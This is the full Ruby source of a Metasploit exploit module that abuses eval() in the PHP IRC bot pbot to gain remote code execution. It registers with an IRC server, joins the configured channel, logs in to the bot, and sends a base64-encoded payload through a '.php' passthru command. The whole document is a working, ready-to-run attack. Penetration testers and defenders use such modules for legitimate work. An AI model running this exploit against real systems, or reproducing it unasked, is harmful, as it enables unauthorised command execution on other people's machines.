# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
 
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::Tcp
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;PHP IRC Bot pbot eval() Remote Code Execution&#039;,
            &#039;Description&#039;    => %q{
                    This module allows remote command execution on the PHP IRC bot pbot by abusing
                the usage of eval() in the implementation of the .php command. In order to work,
                the data to connect to the IRC server and channel where find pbot must be provided.
                The module has been successfully tested on the version of pbot analyzed by Jay
                Turla, and published on Infosec Institute, running over Ubuntu 10.04 and Windows XP
                SP3.
                },
            &#039;Author&#039;         =>
                [
                    &#039;evilcry&#039;, # pbot analysis&#039;
                    &#039;Jay Turla&#039;, # pbot analysis
                    &#039;@bwallHatesTwits&#039;, # PoC
                    &#039;juan vazquez&#039; # Metasploit module
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     =>
                [
                    [ &#039;EDB&#039;, &#039;20168&#039; ],
                    [ &#039;URL&#039;, &#039;http://offensivecomputing.net/?q=node/1417&#039;],
                    [ &#039;URL&#039;, &#039;http://resources.infosecinstitute.com/pbot-analysis/&#039;]
                ],
            &#039;Platform&#039;       => [ &#039;unix&#039;, &#039;win&#039;],
            &#039;Arch&#039;           => ARCH_CMD,
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 344, # According to RFC 2812, the max length message is 512, including the cr-lf
                    &#039;BadChars&#039; => &#039;&#039;,
                    &#039;DisableNops&#039; => true,
                    &#039;Compat&#039;      =>
                        {
                            &#039;PayloadType&#039; => &#039;cmd&#039;,
                        }
                },
            &#039;Targets&#039;  =>
                [
                    [ &#039;pbot&#039;, { } ]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;Nov 02 2009&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                Opt::RPORT(6667),
                OptString.new(&#039;IRC_PASSWORD&#039;, [false, &#039;IRC Connection Password&#039;, &#039;&#039;]),
                OptString.new(&#039;NICK&#039;, [true, &#039;IRC Nickname&#039;, &#039;msf_user&#039;]),
                OptString.new(&#039;CHANNEL&#039;, [true, &#039;IRC Channel&#039;, &#039;#channel&#039;]),
                OptString.new(&#039;PBOT_PASSWORD&#039;, [false, &#039;pbot Password&#039;, &#039;&#039;])
            ], self.class)
    end
 
    def check
        connect
 
        response = register(sock)
        if response =~ /463/ or response =~ /464/
            print_error("#{rhost}:#{rport} - Connection to the IRC Server not allowed")
            return Exploit::CheckCode::Unknown
        end
 
        response = join(sock)
        if not response =~ /353/ and not response =~ /366/
            print_error("#{rhost}:#{rport} - Error joining the #{datastore[&#039;CHANNEL&#039;]} channel")
            return Exploit::CheckCode::Unknown
        end
        response = pbot_login(sock)
        quit(sock)
        disconnect
 
        if response =~ /auth/ and response =~ /logged in/
            return Exploit::CheckCode::Vulnerable
        else
            return Exploit::CheckCode::Safe
        end
    end
 
    def send_msg(sock, data)
        sock.put(data)
        data = ""
        begin
            read_data = sock.get_once(-1, 1)
            while not read_data.nil?
                data << read_data
                read_data = sock.get_once(-1, 1)
            end
        rescue EOFError
        end
        data
    end
 
    def register(sock)
        msg = ""
 
        if datastore[&#039;IRC_PASSWORD&#039;] and not datastore[&#039;IRC_PASSWORD&#039;].empty?
            msg << "PASS #{datastore[&#039;IRC_PASSWORD&#039;]}\r\n"
        end
 
        if datastore[&#039;NICK&#039;].length > 9
            nick = rand_text_alpha(9)
            print_error("The nick is longer than 9 characters, using #{nick}")
        else
            nick = datastore[&#039;NICK&#039;]
        end
 
        msg << "NICK #{nick}\r\n"
        msg << "USER #{nick} #{Rex::Socket.source_address(rhost)} #{rhost} :#{nick}\r\n"
 
        response = send_msg(sock,msg)
        return response
    end
 
    def join(sock)
        join_msg = "JOIN #{datastore[&#039;CHANNEL&#039;]}\r\n"
        response = send_msg(sock, join_msg)
        return response
    end
 
    def pbot_login(sock)
        login_msg = "PRIVMSG #{datastore[&#039;CHANNEL&#039;]} :.login"
        if datastore[&#039;PBOT_PASSWORD&#039;] and not datastore[&#039;PBOT_PASSWORD&#039;].empty?
            login_msg << " #{datastore[&#039;PBOT_PASSWORD&#039;]}"
        end
        login_msg << "\r\n"
        response = send_msg(sock, login_msg)
        return response
    end
 
    def pbot_command(sock)
        encoded = Rex::Text.encode_base64(payload.encoded)
        command_msg = "PRIVMSG #{datastore[&#039;CHANNEL&#039;]} :.php #{rand_text_alpha(1)} passthru(base64_decode(\"#{encoded}\"));\r\n"
        response = send_msg(sock, command_msg)
        return response
    end
 
    def quit(sock)
        quit_msg = "QUIT :bye bye\r\n"
        sock.put(quit_msg)
    end
 
    def exploit
        connect
 
        print_status("#{rhost}:#{rport} - Registering with the IRC Server...")
        response = register(sock)
        if response =~ /463/ or response =~ /464/
            print_error("#{rhost}:#{rport} - Connection to the IRC Server not allowed")
            return
        end
 
        print_status("#{rhost}:#{rport} - Joining the #{datastore[&#039;CHANNEL&#039;]} channel...")
        response = join(sock)
        if not response =~ /353/ and not response =~ /366/
            print_error("#{rhost}:#{rport} - Error joining the #{datastore[&#039;CHANNEL&#039;]} channel")
            return
        end
 
        print_status("#{rhost}:#{rport} - Registering with the pbot...")
        response = pbot_login(sock)
        if not response =~ /auth/ or not response =~ /logged in/
            print_error("#{rhost}:#{rport} - Error registering with the pbot")
            return
        end
 
        print_status("#{rhost}:#{rport} - Exploiting the pbot...")
        pbot_command(sock)
 
        quit(sock)
        disconnect
    end
end



